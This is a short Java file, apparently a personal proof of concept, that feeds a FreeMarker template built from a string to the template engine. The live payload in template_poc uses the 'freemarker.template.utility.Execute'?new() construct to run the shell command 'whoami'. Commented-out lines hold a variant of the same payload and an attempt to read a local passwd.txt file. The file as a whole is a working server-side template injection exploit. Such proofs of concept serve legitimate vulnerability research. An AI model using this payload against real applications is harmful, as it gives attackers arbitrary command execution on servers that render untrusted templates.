package com.example.demo;

import freemarker.cache.StringTemplateLoader;
import freemarker.template.Configuration;
import freemarker.template.Template;
import freemarker.template.TemplateExceptionHandler;

import java.io.StringWriter;
import java.util.HashMap;
import java.util.Map;

public class test2 {
    public static void main(String[] args) throws Exception {
        Configuration cfg = new Configuration(Configuration.VERSION_2_3_20);
        cfg.setTemplateExceptionHandler(TemplateExceptionHandler.RETHROW_HANDLER);
        //Object onj = cfg.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('C:/Users/luke10481/Desktop/passwd.txt').toURL().openStream().readAllBytes();
        Map<String, Object> map = new HashMap<>();
        map.put("Name", "Jimmy");
        map.put("old", "16");

        //String template_poc = "";

        //String template_poc = "${\"freemarker.template.utility.Execute\"?new()(\"whoami\")}";
        String template_poc = "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ ex(\"whoami\")}";

        StringTemplateLoader stringTemplateLoader = new StringTemplateLoader();
        stringTemplateLoader.putTemplate("template_name", template_poc);
        cfg.setTemplateLoader(stringTemplateLoader);

        Template template = cfg.getTemplate("template_name");
        StringWriter out = new StringWriter();
        template.process(map, out);
        out.flush();
        out.close();

        System.out.println(out.toString());
    }
}